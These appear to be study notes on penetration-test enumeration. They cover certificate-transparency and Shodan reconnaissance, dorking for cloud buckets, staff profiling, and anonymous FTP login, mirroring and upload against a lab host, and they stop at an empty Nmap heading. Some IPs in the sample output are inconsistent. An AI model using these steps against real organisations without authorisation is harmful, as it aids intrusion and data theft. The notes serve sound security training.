
# Table of Contents

1.  [Introduction](#orgdf88fae)
    1.  [Enumeration Methodology](#orgf7ba3d9)
        1.  [Enumeration in Cybersecurity](#orgfae74e5)
        2.  [Approach to Investigation:](#org3e6ef9a)
        3.  [Analogous Approach](#org9fe0395)
        4.  [Enumeration Principles](#org7d0586a)
        5.  [Application of Principles](#orgf7a1a86)
    2.  [Enumeration Methodology](#orgbbd19da)
        1.  [Enumeration Layer Overview](#orga419ddf)
        2.  [Layer](#org888a398)
2.  [Infrastructure Based Enumeration](#orged301c9)
    1.  [Domain Information](#org2ae6908)
        1.  [Online Presence](#orgb2c4898)
        2.  [Certificate Transparency](#orgbb326ab)
        3.  [Company Hosted Servers](#org464a3fb)
        4.  [Shodan - IP List](#orgfbdf4e3)
    2.  [Cloud Resources](#org20fa2dc)
        1.  [Company Hosted Servers](#org4443028)
        2.  [Google Search for AWS](#org482af5a)
        3.  [Third-party providers](#org0c76b48)
    3.  [Staff](#org5b11b8c)
3.  [Host Based Enumeration](#orgef6952b)
    1.  [FTP\\20,21](#org6342198)
        1.  [FTP (File Transfer Protocol)](#org343de9d)
        2.  [TFTP (Trivial File Transfer Protocol)](#org08c506d)
        3.  [Default Configuration](#org7907cad)
        4.  [Possible Actions](#org9a80fec)
        5.  [Footprinting the Service](#org26afa98)
    2.  [SMB\\445](#orgbe7ea7f)
        1.  [Samba](#orgc072d18)
        2.  [Footprinting the Service](#orgf7893e4)
    3.  [NFS\\111,2049](#org20365b4)
        1.  [Default Configuration](#orge496385)
        2.  [Footprinting the Service](#org02a5310)
    4.  [DNS\\53(UDP)](#org4926d4b)
        1.  [Default Configuration](#org7ec94a4)
        2.  [Dangerous Settings](#org2cbc509)
        3.  [Footprinting the Service](#orgf0e5676)
    5.  [SMTP\\25,587](#org9e6702c)
        1.  [Default Configuration](#orgeb77455)
        2.  [Telnet - HELO/EHLO](#org018a0c3)
        3.  [Telnet - VRFY](#org831b7d5)
        4.  [Send an Email](#orgfd93266)
        5.  [Dangerous Settings](#orgab4f65e)
        6.  [Footprinting the Service](#orgc9748c8)
    6.  [IMAP / POP3\\110,143,993,995](#org25631b4)
        1.  [Default Configuration](#orgb1087c6)
        2.  [IMAP Commands](#org0e03d88)
        3.  [POP3 Commands](#org83f94f1)
        4.  [Dangerous Settings](#orgd03ff72)
        5.  [Footprinting the Service](#org176fbb1)
    7.  [SNMP\\161(UDP)](#orgc95d151)
        1.  [Default Configuration](#orgc076c55)
        2.  [Dangerous Settings](#org9f5c63b)
        3.  [Footprinting the Service](#orgfb7e0a4)
        4.  [SNMPwalk](#orge9ea254)
        5.  [OneSixtyOne](#org7011b1e)
        6.  [Braa](#org15eac1f)
    8.  [MySQL\\3306](#org99e81b1)
        1.  [core](#org045de55)
        2.  [Default Configuration](#org826edbf)
        3.  [Dangerous Settings](#orged9f7a5)
        4.  [Footprinting the Service](#org83900bb)
    9.  [MSSQL\\1433](#org8ef17ef)
        1.  [Core](#org9e1d742)
        2.  [Default Configuration](#orga8d0aef)
        3.  [Dangerous Settings](#org971648e)
        4.  [Footprinting the Service](#org93f08ff)
    10. [Oracle TNS\\1521](#org6dd716c)
        1.  [Default Configuration](#orgc5c496f)
        2.  [Tools](#orgb652922)
    11. [IPMI\\623](#orge23eb91)
        1.  [Footprinting the Service](#org11abe90)
        2.  [Dangerous Settings](#org50c1979)
4.  [Remote Management Protocols](#org4e42700)
    1.  [Linux](#org128cbe1)
        1.  [SSH\\22](#orgf64c444)
        2.  [Rsync\\873](#orgd493702)
        3.  [R-Services\\512,513,514](#org1bfdb7e)
    2.  [Windows](#orgc5b7eec)
        1.  [RDP\\3389](#org35f3bb2)
        2.  [WinRM\\5985,5986](#orgf728ebd)
        3.  [WMI\\135](#org64d5a46)



<a id="orgdf88fae"></a>

# Introduction


<a id="orgf7ba3d9"></a>

## Enumeration Methodology


<a id="orgfae74e5"></a>

### Enumeration in Cybersecurity

-   <span class="underline">Definition</span>: Enumeration involves **active** and **passive** information gathering methods to collect data about targets like `domains`, `IP addresses`, and `services`.
-   Distinct from <span class="underline">OSINT</span>: It's different from `OSINT` (Open-Source Intelligence), which relies solely on passive information gathering without actively probing the target.


<a id="org3e6ef9a"></a>

### Approach to Investigation:

-   <span class="underline">Understanding Infrastructure</span>: Rather than forcefully breaching systems, focus on `comprehending` the **infrastructure** and `necessary technical aspects`.
-   <span class="underline">Avoid Noisy Method</span>: Avoid noisy methods like `brute-forcing`, as they can **trigger** security measures and hinder further investigation.


<a id="org9fe0395"></a>

### Analogous Approach

-   <span class="underline">Treasure Hunter Analogy</span>: Similar to a treasure hunter planning with `maps` and `tools` instead of randomly digging holes, `understand` the company's `infrastructure` before attempting to breach it.


<a id="org7d0586a"></a>

### Enumeration Principles

-   <span class="underline">Seeing Beyond the Obvious</span>: Consider all perspectives; there's more to uncover than what initially meets the eye.
-   <span class="underline">Distinguishing Seen and Unseen Aspects</span>: Understand the difference between `visible` and `hidden` elements.
-   <span class="underline">Continuous Information Gathering</span>: Always seek ways to understand the target better; there's more information available than what's initially apparent.


<a id="orgf7a1a86"></a>

### Application of Principles

<span class="underline">Constant Reminder</span>: Write down these principles and questions for easy reference during investigations.
These principles guide cybersecurity professionals to delve deeper, consider multiple angles, and continuously gather information to understand and potentially exploit a target's vulnerabilities.


<a id="orgbbd19da"></a>

## Enumeration Methodology

The enumeration methodology in cybersecurity follows a structured approach with six layers, navigating through `infrastructure`, `host`, and `operating system` aspects. It provides flexibility to adapt to diverse target systems, ensuring a comprehensive assessment without overlooking crucial details.


<a id="orga419ddf"></a>

### Enumeration Layer Overview

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Layer</th>
<th scope="col" class="org-left">Description</th>
<th scope="col" class="org-left">Information Categories</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">1. <code>Internet Presence</code></td>
<td class="org-left">Identification of internet presence and externally accessible infrastructure.</td>
<td class="org-left">Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</td>
</tr>


<tr>
<td class="org-left">2. <code>Gateway</code></td>
<td class="org-left">Identify the possible security measures to protect the company's external and internal infrastructure.</td>
<td class="org-left">Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</td>
</tr>


<tr>
<td class="org-left">3. <code>Accessible Services</code></td>
<td class="org-left">Identify accessible interfaces and services that are hosted externally or internally.</td>
<td class="org-left">Service Type, Functionality, Configuration, Port, Version, Interface</td>
</tr>


<tr>
<td class="org-left">4. <code>Processes</code></td>
<td class="org-left">Identify the internal processes, sources, and destinations associated with the services.</td>
<td class="org-left">PID, Processed Data, Tasks, Source, Destination</td>
</tr>


<tr>
<td class="org-left">5. <code>Privileges</code></td>
<td class="org-left">Identification of the internal permissions and privileges to the accessible services.</td>
<td class="org-left">Groups, Users, Permissions, Restrictions, Environment</td>
</tr>


<tr>
<td class="org-left">6. <code>OS Setup</code></td>
<td class="org-left">Identification of the internal components and systems setup.</td>
<td class="org-left">OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</td>
</tr>
</tbody>
</table>

In assessments, we often encounter gaps, yet not all lead to entry. Time-limited penetration tests can't assure uncovering all vulnerabilities. Extensive study exceeds our brief assessments; the SolarWinds cyber attack exemplifies this. A robust methodology must consider such cases.

Consider an external 'black box' penetration test. Upon meeting contract requirements, the assessment commences as scheduled.


<a id="org888a398"></a>

### Layer

1.  Layer No.1: Internet Presence

    This initial layer focuses on identifying targets for investigation, crucially so if the contract scope allows exploring additional hosts. Utilizing diverse techniques, we seek domains, subdomains, netblocks, and various elements indicating the company's online presence.
    <span class="underline">Goal</span>: `Identify all possible target systems and interfaces for testing`.

2.  Layer No.2: Gateway

    Here, we delve into understanding the reachable target's interface, its protective measures, and network placement. Due to diversity and complexities, this layer requires detailed exploration in subsequent modules.
    <span class="underline">Goal</span>: `Grasp the nature of the target and recognize potential risks`.

3.  Layer No.3: Accessible Services

    This layer involves scrutinizing each service's purpose within accessible destinations. Understanding their functions is crucial for effective interaction or exploitation.
    <span class="underline">Goal</span>: `Comprehend service functionalities and communication methods for effective exploitation`.

4.  Layer No.4: Processes

    Every command or function initiates data processing, creating tasks with identifiable sources and targets.
    <span class="underline">Goal</span>: `Understand these processes and dependencies between them`.

5.  Layer No.5: Privileges

    Services operate under specific user and group privileges set by administrators or systems, often overlooked but offering critical functionalities.
    <span class="underline">Goal</span>: `Identify and comprehend available privileges and their capabilities`.

6.  Layer No.6: OS Setup

    Gathering internal access-derived data about the operating system and setup reveals insights into internal security and administrative competencies.
    <span class="underline">Goal</span>: `Assess administrators' system management and extract sensitive internal information`.
    
    A methodology summarizes all systematic procedures in obtaining knowledge within the bounds of a given objective. It is important to note that a methodology is not a step-by-step guide but, as the definition implies, a summary of systematic procedures. In our case, the enumeration methodology is the systematic approach to explore a given target.


<a id="orged301c9"></a>

# Infrastructure Based Enumeration


<a id="org2ae6908"></a>

## Domain Information

Domain info vital for tests; beyond subdomains, it reveals a company's online presence. Passive gathering, discreet as 'visitors,' uncovers tech needs. Analyzing sites unveils services, insights into structure. Understanding unseen tech enriches assessments. We pay attention to what `we see` and `we do not see`.


<a id="orgb2c4898"></a>

### Online Presence

Basic understanding acquired, we delve into the company's **online presence**.
Imagine a scenario: a medium-sized firm hires us for a black-box test with limited target scope.
<span class="underline">Our task</span>: `gather all necessary info independently`.

Exploration <span class="underline">begins</span> with the `SSL certificate` from the <span class="underline">main website</span>, often encompassing multiple active domains, offering initial insight into the company's online footprint.
Another valuable resource is [crt.sh](https://crt.sh/), leveraging `Certificate Transparency logs`, enabling verification of issued digital certificates. This process aids in detecting false or malicious certificates, providing access to stored entries for analysis.
SSL certificate providers like [Let's Encrypt](https://letsencrypt.org/) share this with the web interface [crt.sh](https://crt.sh/), which stores the new entries in the database to be accessed later.


<a id="orgbb326ab"></a>

### Certificate Transparency

Analysis privided by [crt.sh](https://crt.sh/)

    curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .

If needed, we can also have them filtered by the unique subdomains.

    curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.


<a id="org464a3fb"></a>

### Company Hosted Servers

    for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the `cut` command and run them through `Shodan`.


<a id="orgfbdf4e3"></a>

### Shodan - IP List

    for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
    for i in $(cat ip-addresses.txt);do shodan host $i;done

now it is important to continue analyzing the `DNS` for exemple:

    dig any example.com


<a id="org20fa2dc"></a>

## Cloud Resources

The use of cloud, such as AWS, GCP, Azure, and others, is now one of the essential components for many companies nowadays.
For this reason we have to understand this stuff.
This often starts with the `S3 buckets` (AWS), `blobs` (Azure), `cloud storage` (GCP), which can be accessed without authentication if configured incorrectly.


<a id="org4443028"></a>

### Company Hosted Servers

    for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done


<a id="org482af5a"></a>

### Google Search for AWS

One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks `inurl:` Domain (like amazonaws.com) and `intext:` Company name to narrow our search to specific terms.

-   `AWS` => inurl:amazonaws.com
-   `Azure` => inurl:blob.core.windows.net


<a id="org0c76b48"></a>

### Third-party providers

Third-party providers such as domain.glass can also tell us a lot about the company's infrastructure.

-   [domain.glass](https://domain.glass/)
-   [grayhatwarefare.com](https://buckets.grayhatwarfare.com/)


<a id="org5b11b8c"></a>

## Staff

Analyzing social media profiles of employees can provide insights into a company's infrastructure and technology stack.

-   `Job postings` can reveal the preferred programming languages, databases, web frameworks, and version control systems used by a company.
-   `Employee profiles` can showcase their skills and projects, indicating their expertise and the technologies they are familiar with.
-   `GitHub repositories` linked to employee profiles can provide direct access to code and potential vulnerabilities.
-   `LinkedIn` offers advanced search options to filter employees based on their expertise and connections.
-   `Targeting technical employees` in both development and security teams can provide a comprehensive understanding of the company's infrastructure and security posture.


<a id="orgef6952b"></a>

# Host Based Enumeration


<a id="org6342198"></a>

## FTP\\20,21


<a id="org343de9d"></a>

### FTP (File Transfer Protocol)

One of the oldest Internet protocols, operating within the application layer of the `TCP/IP stack`. It establishes control and data channels through TCP ports 21 and 20 respectively. FTP supports active/passive modes, various commands, and status codes for file management. Requires credentials for access, though some servers may offer restricted anonymous FTP. Vulnerable to sniffing as it operates as a clear-text protocol.


<a id="org08c506d"></a>

### TFTP (Trivial File Transfer Protocol)

Simpler than FTP, uses `UDP`, lacks user authentication, and advanced features. Access is limited by OS file permissions, making it suitable only for local and protected networks. Supports basic commands for file transfer but lacks directory listing functionality.
Let us take a look at a few `commands of TFTP`:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Command</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">connect</td>
<td class="org-left">Sets the remote host and, optionally, the port for file transfers.</td>
</tr>


<tr>
<td class="org-left">get</td>
<td class="org-left">Transfers file(s) from the remote host to the local host.</td>
</tr>


<tr>
<td class="org-left">put</td>
<td class="org-left">Transfers file(s) from the local host onto the remote host.</td>
</tr>


<tr>
<td class="org-left">quit</td>
<td class="org-left">Exits TFTP.</td>
</tr>


<tr>
<td class="org-left">status</td>
<td class="org-left">Shows the current status of TFTP, including transfer mode, connection status, timeout value, etc.</td>
</tr>


<tr>
<td class="org-left">verbose</td>
<td class="org-left">Turns verbose mode (additional information during file transfer) on or off.</td>
</tr>
</tbody>
</table>


<a id="org7907cad"></a>

### Default Configuration

One of the most used FTP servers on Linux-based distributions is [vsFTPd](https://security.appspot.com/vsftpd.html). The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`, and some settings are already predefined by default.

1.  Install vsFTPd

        sudo apt install vsftpd 

2.  vsFTPd Config File

        cat /etc/vsftpd.conf | grep -v "#"
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">`listen`</td>
    <td class="org-left">Run from inetd or as a standalone daemon? (`NO` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`listen<sub>ipv6</sub>`</td>
    <td class="org-left">Listen on IPv6? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`anonymous<sub>enable</sub>`</td>
    <td class="org-left">Enable Anonymous access? (`NO` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`local<sub>enable</sub>`</td>
    <td class="org-left">Allow local users to login? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`dirmessage<sub>enable</sub>`</td>
    <td class="org-left">Display active directory messages when users go into certain directories? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`use<sub>localtime</sub>`</td>
    <td class="org-left">Use local time? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`xferlog<sub>enable</sub>`</td>
    <td class="org-left">Activate logging of uploads/downloads? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`connect<sub>from</sub><sub>port</sub><sub>20</sub>`</td>
    <td class="org-left">Connect from port 20? (`YES` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`secure<sub>chroot</sub><sub>dir</sub>`</td>
    <td class="org-left">Name of an empty directory (`/var/run/vsftpd/empty` by default)</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`pam<sub>service</sub><sub>name</sub>`</td>
    <td class="org-left">The name of the PAM service vsftpd will use.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`rsa<sub>cert</sub><sub>file</sub>`</td>
    <td class="org-left">Location of the RSA certificate to use for SSL encrypted connections.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`rsa<sub>private</sub><sub>key</sub><sub>file</sub>`</td>
    <td class="org-left">Location of the RSA private key to use for SSL encrypted connections.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`ssl<sub>enable</sub>`</td>
    <td class="org-left">Enable SSL? (`NO` by default)</td>
    </tr>
    </tbody>
    </table>
    
    In addition, there is a file called `/etc/ftpusers` that we also need to pay attention to, as this file is used to deny certain users access to the FTP service.
    
        cat /etc/ftpusers
        
        guest

3.  Dangerous Settings

    FTP servers offer numerous security-related configurations to test connections, routes, and authentication methods. Among these mechanisms is the anonymous user, commonly used within internal networks to facilitate file and data sharing without direct access to individual computers. For vsFTPd, configuration settings for anonymous login include:
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">`anonymous<sub>enable</sub>=YES`</td>
    <td class="org-left">Allowing anonymous login?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`anon<sub>upload</sub><sub>enable</sub>=YES`</td>
    <td class="org-left">Allowing anonymous to upload files?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`anon<sub>mkdir</sub><sub>write</sub><sub>enable</sub>=YES`</td>
    <td class="org-left">Allowing anonymous to create new directories?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`no<sub>anon</sub><sub>password</sub>=YES`</td>
    <td class="org-left">Do not ask anonymous for a password?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`anon<sub>root</sub>=/home/username/ftp`</td>
    <td class="org-left">Directory for anonymous.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`write<sub>enable</sub>=YES`</td>
    <td class="org-left">Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</td>
    </tr>
    </tbody>
    </table>
    
    -   <span class="underline">Access via FTP Client</span>: Using the standard FTP client (`ftp`) allows access to the FTP server with the configured `anonymous user` if the aforementioned settings have been applied.
    -   <span class="underline">Usage in Internal Environments</span>: The anonymous account is utilized in known internal environments or infrastructures where participants are recognized. This facilitates file exchange, either temporarily or as a consistent setting.
    -   <span class="underline">vsFTPd Server Connection</span>:
        -   Response Code: Upon connection to the vsFTPd server, it responds with the `code 220`, displaying the FTP server `banner`.
        -   Banner Content: The banner typically contains `service description`, `version details`, and the `system type` of the FTP server.
    -   <span class="underline">Anonymous Access Configuration</span>:
        -   Common Configuration: Many FTP servers are configured to `allow anonymous access`, granting access to certain files without requiring legitimate credentials.
        -   Access Benefits: Even if downloading files is restricted, listing the file contents can provide valuable insights, aiding in generating ideas or collecting information for alternative approaches.


<a id="org9a80fec"></a>

### Possible Actions

1.  Anonymous Login

        ftp 10.189.114.136
        
        Connected to 10.129.14.136.
        220 "Welcome to the vsFTP service."
        Name (10.129.14.136:cry0l1t3): anonymous
        
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.
        
        
        ftp> ls
        
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        -rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
        -rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
        226 Directory send OK.

2.  vsFTPd Status

        ftp> status
        
        Connected to 10.129.14.136.
        No proxy connection.
        Connecting using address family: any.
        Mode: stream; Type: binary; Form: non-print; Structure: file
        Verbose: on; Bell: off; Prompting: on; Globbing: on
        Store unique: off; Receive unique: off
        Case: off; CR stripping: on
        Quote control characters: on
        Ntrans: off
        Nmap: off
        Hash mark printing: off; Use of PORT cmds: on
        Tick counter printing: off

3.  vsFTPd Detailed Output

        ftp> debug
        
        Debugging on (debug=1).
        
        
        ftp> trace
        
        Packet tracing on.
        
        
        ftp> ls
        
        ---> PORT 10,10,14,4,188,195
        200 PORT command successful. Consider using PASV.
        ---> LIST
        150 Here comes the directory listing.
        -rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
        drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
        -rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
        226 Directory send OK.
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">`dirmessage<sub>enable</sub>=YES`</td>
    <td class="org-left">Show a message when users enter a new directory?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`chown<sub>uploads</sub>=YES`</td>
    <td class="org-left">Change ownership of anonymously uploaded files?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`chown<sub>username</sub>=username`</td>
    <td class="org-left">User given ownership of anonymously uploaded files.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`local<sub>enable</sub>=YES`</td>
    <td class="org-left">Enable local users to log in?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`chroot<sub>local</sub><sub>user</sub>=YES`</td>
    <td class="org-left">Place local users into their home directory?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`chroot<sub>list</sub><sub>enable</sub>=YES`</td>
    <td class="org-left">Use a list of local users to be placed in their home directory?</td>
    </tr>
    </tbody>
    </table>

4.  Hiding IDs - YES

    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">`hide<sub>ids</sub>=YES`</td>
    <td class="org-left">All user and group information in directory listings displayed as "ftp".</td>
    </tr>
    
    
    <tr>
    <td class="org-left">`ls<sub>recurse</sub><sub>enable</sub>=YES`</td>
    <td class="org-left">Allows the use of recursive listings.</td>
    </tr>
    </tbody>
    </table>
    
    In the following example, we can see that if the `hide_ids=YES` setting is present, the `UID` and `GUID` representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.
    
        ftp> ls
        
        ---> TYPE A
        200 Switching to ASCII mode.
        ftp: setsockopt (ignored): Permission denied
        ---> PORT 10,10,14,4,223,101
        200 PORT command successful. Consider using PASV.
        ---> LIST
        150 Here comes the directory listing.
        -rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
        drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
        drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents
        drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees
        -rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
        -rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
        226 Directory send OK.
    
    This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory.

5.  Recursive Listing

    Another helpful setting we can use for our purposes is the `ls_recurse_enable=YES`. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.
    
        ftp> ls -R
        
        ---> PORT 10,10,14,4,222,149
        200 PORT command successful. Consider using PASV.
        ---> LIST -R
        150 Here comes the directory listing.
        .:
        -rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
        drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
        drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
        drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
        -rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
        -rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt
        
        ./Clients:
        drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
        drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight
        
        ./Clients/HackTheBox:
        -rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
        -rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
        -rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
        -rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt
        
        ./Clients/Inlanefreight:
        -rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
        -rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
        -rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
        -rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx
        
        ./Documents:
        -rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
        -rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
        -rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf
        
        ./Employees:
        226 Directory send OK.

6.  Download a File

    Downloading files from such an FTP server is one of the main features, as well as uploading files created by us.
    this paves the way for techniques such as `LFI` or `RCE`.
    
        ftp> ls
        
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        -rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx
        drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients
        drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents
        drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees
        -rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt
        226 Directory send OK.
        
        
        ftp> get Important\ Notes.txt
        
        local: Important Notes.txt remote: Important Notes.txt
        200 PORT command successful. Consider using PASV.
        150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
        226 Transfer complete.
        41 bytes received in 0.00 secs (606.6525 kB/s)
        
        
        ftp> exit
        
        221 Goodbye.

7.  Download All Available Files

         wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
        
        --2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
                   => ‘10.129.14.136/.listing’                                                                     
        Connecting to 10.129.14.136:21... connected.                                                               
        Logging in as anonymous ... Logged in!
        ==> SYST ... done.    ==> PWD ... done.
        ==> TYPE I ... done.  ==> CWD not needed.
        ==> PORT ... done.    ==> LIST ... done.                                                                 
        12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       
        
        2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     
        --2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   
                   => ‘10.129.14.136/Calendar.pptx’                                       
        ==> CWD not required.                                                           
        ==> SIZE Calendar.pptx ... done.                                                                                                                            
        ==> PORT ... done.    ==> RETR Calendar.pptx ... done.       
        
        ...SNIP...
        
        2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]
        
        FINISHED --2021-09-19 14:45:58--
        Total wall clock time: 0,03s
        Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)

8.  Upload a File

    With the `PUT command`, we can upload files in the current folder to the FTP server.
    
        ftp> put testupload.txt 
        
        local: testupload.txt remote: testupload.txt
        ---> PORT 10,10,14,4,184,33
        200 PORT command successful. Consider using PASV.
        ---> STOR testupload.txt
        150 Ok to send data.
        226 Transfer complete.
        
        
        ftp> ls
        
        ---> TYPE A
        200 Switching to ASCII mode.
        ---> PORT 10,10,14,4,223,101
        200 PORT command successful. Consider using PASV.
        ---> LIST
        150 Here comes the directory listing.
        -rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
        drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
        drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
        -rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
        -rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
        226 Directory send OK.


<a id="org26afa98"></a>

### Footprinting the Service

1.  Nmap FTP Scripts

        sudo nmap --script-updatedb
    
    All the NSE scripts are located in `/usr/share/nmap/scripts/`, but on our systems, we can find them using a simple command on our system.
    
        find / -type f -name ftp* 2>/dev/null | grep scripts

2.  Nmap

